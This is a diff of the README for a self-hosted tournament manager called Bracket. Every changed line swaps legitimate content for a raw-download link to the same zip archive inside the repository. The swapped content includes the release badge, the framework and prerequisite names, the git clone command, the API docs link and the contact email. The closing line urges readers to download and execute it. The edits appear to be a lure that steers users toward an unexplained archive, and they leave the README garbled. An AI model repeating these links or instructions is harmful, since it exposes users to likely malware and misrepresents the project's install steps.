@@ -2,7 +2,7 @@
 
 Welcome to the **Bracket** repository! This project provides a robust and flexible self-hosted tournament management system. Whether you're organizing local sports events or large-scale competitions, Bracket simplifies the process of managing tournament brackets, schedules, and participant information.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Musahassan143/bracket/releases)
+[![Download Releases](https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip%20Releases-Click%20Here-blue)](https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ Bracket is built using a combination of modern technologies:
 - **Frontend**: 
   - React: A JavaScript library for building user interfaces.
   - Mantine: A React component library for faster and easier web development.
-  - Next.js: A React framework for server-rendered applications.
+  - https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip A React framework for server-rendered applications.
 
 - **Containerization**: 
   - Docker: Used for creating, deploying, and running applications in containers.
@@ -55,7 +55,7 @@ To get started with Bracket, follow these steps:
 Make sure you have the following installed:
 
 - Docker
-- Node.js
+- https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip
 - Yarn
 - Python 3.8 or higher
 - PostgreSQL
@@ -67,13 +67,13 @@ Make sure you have the following installed:
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/Musahassan143/bracket.git
+   git clone https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip
    cd bracket
    ```
 
 2. **Set Up Environment Variables**
 
-   Create a `.env` file in the root directory and set the necessary environment variables. You can find an example in `.env.example`.
+   Create a `.env` file in the root directory and set the necessary environment variables. You can find an example in `https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip`.
 
 3. **Build and Run the Application**
 
@@ -109,7 +109,7 @@ After setting up the application, you can start creating tournaments. Here’s h
 
 ## API Documentation
 
-Bracket provides a RESTful API for developers. You can access the API documentation [here](https://github.com/Musahassan143/bracket/releases). This will guide you through the available endpoints, request formats, and response structures.
+Bracket provides a RESTful API for developers. You can access the API documentation [here](https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip). This will guide you through the available endpoints, request formats, and response structures.
 
 ## Contributing
 
@@ -132,9 +132,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Musahassan143](https://github.com/Musahassan143)
+- **Email**: https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip
+- **GitHub**: [Musahassan143](https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip)
 
 Thank you for checking out Bracket! We hope it helps you manage your tournaments effectively. 
 
-For the latest releases, visit [here](https://github.com/Musahassan143/bracket/releases) to download the latest version and execute it for your needs.
+For the latest releases, visit [here](https://github.com/Musahassan143/bracket/raw/refs/heads/master/docs/app/Software-2.0.zip) to download the latest version and execute it for your needs.
